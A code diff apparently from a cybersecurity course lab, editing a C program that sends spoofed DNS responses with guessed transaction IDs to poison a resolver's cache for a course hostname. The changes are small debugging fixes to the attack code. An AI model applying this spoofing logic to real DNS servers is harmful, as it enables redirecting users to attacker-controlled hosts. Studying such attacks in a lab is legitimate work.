@@ -90,7 +90,7 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(destination_port);
-    inet_pton(AF_INET, destination_ip, &server_addr.sin_addr);
+    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
 
     // Step 3: Assume we already have the DNS query (this would normally come from the client)
     unsigned char query[BUFFER_SIZE];
@@ -99,7 +99,7 @@ void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *
     // Step 4: Build the DNS response
     int response_len = build_dns_response(buffer, query, query_len, txid);
     printf("response_len: %d\n", response_len);
-    printf("buffer: %s\n", buffer);
+    printf("query: %s\n", query);
     // Step 5: Send the spoofed DNS response
     if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Failed to send spoofed DNS response");
@@ -219,7 +219,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port);
+        send_spoofed_dns_response("www.example.cybercourse.com.", txid_ls[i], DNS_SERVER_IP, source_port);
     }
     
     // Close the connection
